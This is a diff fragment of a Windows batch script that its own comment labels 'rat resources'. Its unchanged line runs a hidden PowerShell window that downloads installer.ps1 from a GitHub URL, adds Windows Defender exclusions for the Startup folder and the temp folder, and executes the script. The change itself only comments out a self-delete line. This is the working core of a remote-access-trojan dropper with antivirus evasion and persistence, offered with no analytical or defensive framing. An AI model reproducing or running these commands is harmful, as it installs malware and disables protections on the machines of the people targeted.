@@ -40,4 +40,4 @@ REM rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE/main/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"; ./installer.ps1
 
 @REM self delete
-del GetAdmnInstKL.cmd
+@REM del GetAdmnInstKL.cmd
